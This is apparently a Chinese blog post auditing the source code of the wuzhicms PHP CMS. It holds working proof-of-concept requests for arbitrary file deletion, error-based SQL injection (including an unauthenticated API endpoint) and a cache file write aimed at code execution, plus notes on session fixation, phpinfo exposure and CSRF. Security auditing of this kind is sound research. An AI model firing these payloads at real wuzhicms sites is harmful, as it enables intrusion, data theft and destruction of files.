---
title: wuzhicms 代码审计
date: 2025-07-20T17:00:00+08:00
tags:
  - "PHP 代码审计"
categories:
  - "PHP"
description: wuzhicms 代码审计
showToc: true
draft: false
tocOpen: true
---
# wuzhicms 代码审计

# 根目录分析

api					API接口，找未授权、SQL注入
caches			 缓存目录
configs			配置文件
coreframe		框架核心代码
install				安装目录，安装后应删除
map					
promote
res					静态资源
uploadfile		上传文件储存目录，文件上传漏洞



# 分析代码(参考README.md)

程序模块结构说明

```
|-- coreframe                   #框架目录
|   |-- app                     #模块（应用程序）目录
|   |   |-- affiche             #公告模块
|   |   |-- appshop             #应用商城
|   |   |-- attachment          #附件模块
|   |   |-- collect             #采集器
|   |   |-- content             #内容模块
|   |   |-- core                #核心模块
|   |   |-- coupon              #优惠券模块
|   |   |-- credit              #积分模块
|   |   |-- database            #数据库模块
|   |   |-- dianping            #点评模块
|   |   |-- guestbook           #留言板模块
|   |   |-- link                #友情链接模块
|   |   |-- linkage             #联动菜单
|   |   |-- member              #会员模块
|   |   |-- message             #站内短信模块
|   |   |-- mobile              #移动手机模块
|   |   |-- order               #订单模块
|   |   |-- pay                 #支付模块
|   |   |-- ppc                 #推广模块
|   |   |-- receipt             #发票申请模块
|   |   |-- search              #全站搜索模块
|   |   |-- sms                 #短信模块
|   |   |-- tags                #tags模块
|   |   --- template            #在线模板编辑
|   |-- configs                 #框架配置
|   |-- core.php                #框架入口
|   |-- crontab                 #定时脚本目录
|   |-- crontab.php             #定时脚本入口
|   |-- extend                  #扩展目录
|   |-- languages               #语言包
|   --- templates               #模板
|-- caches                      #缓存目录
|   |-- _cache_                 #公共缓存
|   |-- block                   #区块、碎片缓存
|   |-- content                 #内容模块缓存，栏目缓存
|   |-- db_bak                  #数据库备份路径
|   |-- install.check           #安装锁定
|   |-- model                   #模型缓存
|   --- templates               #模板缓存
--- www                         #网站根目录
    |-- 404.html                #404页面
    |-- admin.php               #后台入口
    |-- api                     #api目录
    |-- configs                 #网站配置
    |-- favicon.ico             #浏览器icon
    |-- index.html              #网站首页
    |-- index.php               #动态地址首页
    |-- res                     #静态资源
    |-- robots.txt              #搜索引擎防抓取规则
    |-- uploadfile              #附件
    `-- web.php                 #自定义路由
```



## app/ #模块（应用程序）目录

先去核心模块看

### coreframe/app/core/admin/index.php	后台登录首页

因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件

```php
function init() {
	$lang = get_cookie('lang') ? get_cookie('lang') : LANG;
	require COREFRAME_ROOT.'languages/'.$lang.'/admin_menu.lang.php';
        
public function left() {
	$lang = get_cookie('lang') ? get_cookie('lang') : LANG;
	require COREFRAME_ROOT.'languages/'.$lang.'/admin_menu.lang.php';              
```

此处是ai发现的一个漏洞，实际上很难触发，记录：

1. 登录成功后不生成新session ID
2. 直接重用攻击者提供的session ID

利用：

1. 攻击者获取自己的session ID：`PHPSESSID=attacker_sess`
2. 构造钓鱼链接：

```
http://target.com/admin/?m=core&f=index&v=login&submit=1&checkcode=...[有效验证码]...&username=admin&password=123456
```

1. 诱使管理员点击链接（含攻击者的session ID）
2. 管理员登录后，攻击者使用相同的`PHPSESSID`即可直接进入管理员账户

```php
//登录
    function login() {
        //已经登陆的用户重定向到后台首页
        if (isset($_SESSION['uid']) && $_SESSION['uid']!='') {
            MSG(L('already login'), '?m=core&f=index'.$this->su(0));
        }
		...
		$_SESSION['uid'] = $_SESSION['role'] = 0		
}
```



暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。

路由：

`http://wuzhicms:7575/index.php?m=core&f=index&_su=wuzhicms&v=phpinfo`

```php
/**
     * 显示 phpinfo 内容
     */
    function phpinfo() {
        echo phpinfo();
    }
```

![20250717125939730](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png)



### coreframe/app/appupdate/admin/index.php

如果 $filePath 为 ../../../index.php，则 COREFRAME_ROOT . '../../../index.php' 就可以指向系统目录外的敏感文件。

```php
protected function _deleteFilesForPackageUpdate($packageDir)
    {
        if (!$this->filesystem->exists($packageDir.'/delete')) {
            return;
        }

        $handle = fopen($packageDir.'/delete', 'r');

        while ($filePath = fgets($handle)) {
            $filePath= trim($filePath);
            if(substr($filePath,0,9)=='coreframe') {
                $fullPath = COREFRAME_ROOT.substr($filePath,9);
                if ($this->filesystem->exists($fullPath)) {
                    $this->filesystem->remove($fullPath);
                }
            } elseif(substr($filePath,0,3)=='www') {
                $fullPath = WWW_ROOT.substr($filePath,3);
                if ($this->filesystem->exists($fullPath)) {
                    $this->filesystem->remove($fullPath);
                }
            }

        }

        fclose($handle);
    }
```





# 搜关键字

## 文件安全：

### 任意文件删除

搜索del() -> coreframe/app/attachment/admin/index.php -> del()

有可控变量 $url 

```php
public function del()
    {
        $id = isset($GLOBALS['id']) ? $GLOBALS['id'] : '';//从全局变量 $GLOBALS 中获取 id 和 url
        $url = isset($GLOBALS['url']) ? remove_xss($GLOBALS['url']) : '';//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击
        if (!$id && !$url) MSG(L('operation_failure'), HTTP_REFERER, 3000);//判断是否都为空
        if ($id) {//按 id 删除
        	if(!is_array($id)) {//将 id 转化为数组
				$ids = array($id);
			} else {
				$ids = $id;
			}

			foreach($ids as $id) {
				$where = array('id' => $id);
				$att_info = $this->db->get_one('attachment', $where, 'usertimes,path');//从 attachment 表中查找该 id的记录并取usertimes 和 path
				if ($att_info['usertimes'] > 1) {//若引用数大于 1，只减少使用次数，不删除物理文件
					$this->db->update('attachment', 'usertimes = usertimes-1', $where);
				} else {//否则，彻底删除
					$this->my_unlink(ATTACHMENT_ROOT . $att_info['path']);
					$this->db->delete('attachment', $where);
					$this->db->delete('attachment_tag_index', array('att_id'=>$id));
				}
			}
			MSG(L('delete success'), HTTP_REFERER, 1000);
        } else {
            if (!$url) MSG('url del ' . L('operation_failure'), HTTP_REFERER, 3000);//按url 删除，如果没有 URL，报错返回。
            $path = str_ireplace(ATTACHMENT_URL, '', $url);//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path
            if ($path) {
                $where = array('path' => $path);//根据 path 查找数据库记录
                $att_info = $this->db->get_one('attachment', $where, 'usertimes,id');

                if (empty($att_info)) {//如果没有记录，只删物理文件
                    $this->my_unlink(ATTACHMENT_ROOT . $path);
                    MSG(L('operation_success'), HTTP_REFERER, 3000);
                }

                if ($att_info['usertimes'] > 1) {//引用多次，只减引用次数
                    $this->db->update('attachment', 'usertimes = usertimes-1', array('id' => $att_info['id']));
                }
                else {
                    $this->my_unlink(ATTACHMENT_ROOT . $path);
                    $this->db->delete('attachment', array('id' => $att_info['id']));
                    MSG(L('operation_success'), HTTP_REFERER, 3000);
                }
            }
            else {
                MSG(L('operation_failure'), HTTP_REFERER, 3000);
            }
        }
    }
```

跟进my_unlink

```php
private function my_unlink($path)
    {
        if(file_exists($path)) unlink($path);//文件存在直接删除
    }
```



index.php?m=attachment&f=index&v=del&_su=wuzhicms&url=../../1.txt

![20250717140708632](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png)



## SQL注入

搜索select

发现这里的很多参数都是原样拼接，可能存在风险

```php
//  coreframe/app/core/libs/class/mysqli.class.php

public function get_list($table, $where = '', $field = '*', $limit = '', $order = '', $group = '', $keyfield = '') {
		$arr = array();
		$where = $where ? ' WHERE '.$where: '';
		$field = $field == '*' ? '*' : self::safe_filed($field);
		$order = $order ? ' ORDER BY '.$order : '';
		$group = $group ? ' GROUP BY '.$group : '';
		$limit = $limit ? ' LIMIT '.$limit : '';

		$sql = 'SELECT '.$field.' FROM `'.$this->tablepre.$table.'`'.$where.$group.$order.$limit;
		$query = $this->query($sql);
		while($data = $this->fetch_array($query)) {
			if($keyfield) {
				$arr[$data[$keyfield]] = $data;
			} else {
				$arr[] = $data;
			}
		}
		return $arr;
	}
```

跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords

```php
// coreframe/app/promote/admin/index.php
public function search() {
        $siteid = get_cookie('siteid');
        $page = isset($GLOBALS['page']) ? intval($GLOBALS['page']) : 1;
        $page = max($page,1);
        $fieldtype = $GLOBALS['fieldtype'];
        $keywords = $GLOBALS['keywords'];
        if($fieldtype=='place') {
            $where = "`siteid`='$siteid' AND `name` LIKE '%$keywords%'";
            $result = $this->db->get_list('promote_place', $where, '*', 0, 50,$page,'pid ASC');
            $pages = $this->db->pages;
            $total = $this->db->number;
            include $this->template('listingplace');
        } else {
            $where = "`siteid`='$siteid' AND `$fieldtype` LIKE '%$keywords%'";
            $result = $this->db->get_list('promote',$where, '*', 0, 20,$page,'id DESC');
            $pages = $this->db->pages;
            $total = $this->db->number;
            include $this->template('listing');
        }


    }
```

$fieldtype、$keywords俩个参数拼接到$where中，



构造poc:

`index.php?m=promote&f=index&_su=wuzhicms&v=search&fieldtype=place&keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+`

![20250717143106637](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png)

# 记一些知识点、函数

```
$GLOBALS = array();//清除所有的全局变量
```

```
microtime函数返回当前 Unix 时间戳的微秒数。
```

magic_quotes_runtime 的作用

http://blog.csdn.net/tom_green/article/details/7039002

magic_quotes_gpc函数详解 

https://www.cnblogs.com/timelesszhuang/p/3726736.html



# 漏洞补充：

## CSRF漏洞

五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。



## 前台SQL注入

多个变量未使用引号包裹的SQL语句,只要是调用`get_one`这个函数的地方都存在SQL注入

```php
public function get_one($table, $where, $field = '*', $limit = '', $order = '', $group = '', $condition = TRUE) {
		$where = $where ? ' WHERE '.$where: '';
		if($condition) {
			$field = $field == '*' ? '*' : self::safe_filed($field);
		} else {
			$field = $this->escape_string($field);
		}
		$order = $order ? ' ORDER BY '.$order : '';
		$group = $group ? ' GROUP BY '.$group : '';
		$limit = $limit ? ' LIMIT '.$limit : '';

		$sql = 'SELECT '.$field.' FROM `'.$this->tablepre.$table.'`'.$where.$group.$order.$limit;
		$query = $this->query($sql);
		return $this->fetch_array($query);
	}
```

api/sms_check.php,找到可控变量

```php
<?php

define('WWW_ROOT',substr(dirname(__FILE__), 0, -4).'/');
require '../configs/web_config.php';
require COREFRAME_ROOT.'core.php';


if(!isset($GLOBALS['param'])) {
	exit('{"info":"验证失败","status":"n"}');
} elseif($GLOBALS['param']=='') {
	exit('{"info":"验证失败","status":"n"}');
}
$code = strip_tags($GLOBALS['param']);
$posttime = SYS_TIME-300;//5分钟内有效
$db = load_class('db');
$r = $db->get_one('sms_checkcode',"`code`='$code' AND `posttime`>$posttime",'*',0,'id DESC');
if($r) {
	exit('{"info":"验证通过","status":"y"}');
} else {
	exit('{"info":"验证失败","status":"n"}');
}

```



api/sms_check.php?param=1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20--+

![20250717144135245](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png)





## 任意文件写入导致RCE

搜索`file_put_contents()` 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。

coreframe/app/core/libs/function/common.func.php

```php
function set_cache($filename, $data, $dir = '_cache_'){
	static $_dirs;
	if ($dir == '') return FALSE;
	if (!preg_match('/([a-z0-9_]+)/i', $filename)) return FALSE;
	$cache_path = CACHE_ROOT . $dir . '/';
	if (!isset($_dirs[$filename . $dir])) {
		if (!is_dir($cache_path)) {
			mkdir($cache_path, 0777, true);
		}
		$_dirs[$filename . $dir] = 1;
	}

	$filename = $cache_path . $filename . '.' . CACHE_EXT . '.php';
	if (is_array($data)) {
		$data = '<?php' . "\r\n return " . array2string($data) . '?>';
	}
	file_put_contents($filename, $data);
}
```

```
index.php?m=attachment&f=index&_su=wuzhicms&v=ueditor&submit=1&setting=%3Cphp%20phpinfo();%3E
```



## 文章：

五指CMS 4.1.0存在CSRF漏洞可增加管理员账户

https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/

wuzhicms代码审计

https://blog.csdn.net/RestoreJustice/article/details/129734772